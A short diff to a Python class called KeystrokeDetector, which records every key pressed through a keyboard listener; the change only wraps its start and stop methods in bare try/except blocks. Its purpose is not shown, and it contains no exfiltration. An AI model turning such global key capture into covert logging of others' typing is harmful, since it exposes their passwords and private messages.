@@ -14,13 +14,20 @@ class KeystrokeDetector:
             self.keys += (' ' + format(key) + ' ')
 
     def start_listening(self):
-        self.keys = ''
-        self.hooked = True
-        listener = Listener(on_press=self.on_press)
-        listener.start()
+        try:
+            self.keys = ''
+            self.hooked = True
+            listener = Listener(on_press=self.on_press)
+            listener.start()
+            return True
+        except:
+            return False
 
     def end_listening(self):
-        self.hooked = False
+        try:
+            self.hooked = False
+        except:
+            return True
 
     def get_keys(self):
         key = self.keys
